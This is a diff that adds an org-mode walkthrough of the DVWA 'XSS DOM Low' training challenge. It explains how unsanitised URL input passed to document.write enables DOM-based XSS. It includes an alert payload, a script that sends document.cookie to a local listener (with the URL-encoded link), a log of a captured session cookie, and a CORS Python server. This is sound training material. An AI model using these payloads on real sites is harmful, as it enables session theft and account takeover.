@@ -1,0 +1,130 @@
+#+TITLE: DVWA - XSS DOM Low
+#+AUTHOR: Leonardo Tamiano
+
+* Description
+  We have a select that allows us to choosen a language. The language
+  choosen is then set as the first option in the select.
+
+  If we inspect the code, we have the following javascript running on
+  the page
+
+  #+begin_src html
+<form name="XSS" method="GET">
+  <select name="default">
+    <script>
+      if (document.location.href.indexOf("default=") >= 0) {
+      var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
+      document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
+      document.write("<option value='' disabled='disabled'>----</option>");
+      }
+      
+      document.write("<option value='English'>English</option>");
+      document.write("<option value='French'>French</option>");
+      document.write("<option value='Spanish'>Spanish</option>");
+      document.write("<option value='German'>German</option>");
+    </script>
+  </select>
+  <input type="submit" value="Select" />
+</form>
+  #+end_src
+
+  Notice how the value we put in the URL is used to build the DOM of
+  the page. This opens up the possibility for a DOM base XSS. These
+  types of XSS are a special case of reflected XSS where the malicious
+  javascript is hidden in the URL and is pulled out by the javascript
+  executing on the page while it is rendering the page rather than
+  when the page is served by the server.
+
+  This means that in DOM based XSS the final XSS payload is
+  constructed dynamically during rendering instead of being served
+  statically during the fetch from the servers. This can make it
+  stealthier than other attacks and WAFs or other protections which
+  are reading the page body do not see any malicious content.
+  
+* Solution
+  Here the request is given as follows
+
+  #+begin_example
+GET /vulnerabilities/xss_d/?default=English HTTP/1.1
+Host: evil
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://evil/vulnerabilities/xss_d/?default=English
+Accept-Encoding: gzip, deflate, br
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=7puv2ipbq4rn2o5dtvg3qi71n7; security=low
+Connection: close
+  #+end_example
+
+  by changing the ~default~ parameter we're able to change the DOM of
+  the page. From the payload before the following HTML is constructed
+  in the page
+
+  #+begin_src html
+<select name="default">
+  <option value="English">English</option>
+  <option value="" disabled="disabled">----</option>
+  <option value="English">English</option>
+  <option value="French">French</option>
+  <option value="Spanish">Spanish</option>
+  <option value="German">German</option>
+</select>			
+  #+end_src
+
+  Consider now the following payload
+
+  #+begin_example
+English<script>alert(1)</script>
+  #+end_example
+
+  if we put this payload in the URL of the victim browser, then when
+  his page will be built, it will construct the malicious javascript
+  and execute it. Server side there's absolutely no check on making
+  sure that the input do not contain malicious XSS payloads, and so
+  we're able to execute it.
+
+  [[./img/low.png]]
+
+  --------
+
+  To actually leak the cookie value, we can use the following payload
+
+  #+begin_src js
+<script> var xhr = new XMLHttpRequest(); xhr.open('GET', `http://127.0.0.1:1337/${document.cookie}`, false); xhr.send(null); </script>
+  #+end_src
+
+  which we can encode in the following URL
+
+  #+begin_example
+http://evil/vulnerabilities/xss_d/?default=%3Cscript%3E%20var%20xhr%20=%20new%20XMLHttpRequest();%20xhr.open(%27GET%27,%20`http://127.0.0.1:1337/${document.cookie}`,%20false);%20xhr.send(null);%20%3C/script%3E
+  #+end_example
+  
+  then we start a python server which allows for CORS and by making a
+  user click on that link we see the following
+
+  #+begin_example
+(venv) [leo@archlinux xss_dom]$ python3 cors-server.py 
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+127.0.0.1 - - [11/Nov/2023 18:38:58] code 404, message File not found
+127.0.0.1 - - [11/Nov/2023 18:38:58] "GET /PHPSESSID=raa5vui83s45lmdpd7bfo3suk3;%20security=low HTTP/1.1" 404 -
+  #+end_example
+
+  the code for the server is the same one as used in the CSRF
+  challenge and is also reported below for completeness
+
+  #+begin_src python
+#!/usr/bin/env python3
+
+from http.server import HTTPServer, SimpleHTTPRequestHandler, test
+import sys
+
+class CORSRequestHandler (SimpleHTTPRequestHandler):
+    def end_headers (self):
+        self.send_header('Access-Control-Allow-Origin', '*')
+        SimpleHTTPRequestHandler.end_headers(self)
+
+if __name__ == '__main__':
+    test(CORSRequestHandler, HTTPServer, port=int(sys.argv[1]) if len(sys.argv) > 1 else 1337)
+  #+end_src
+  
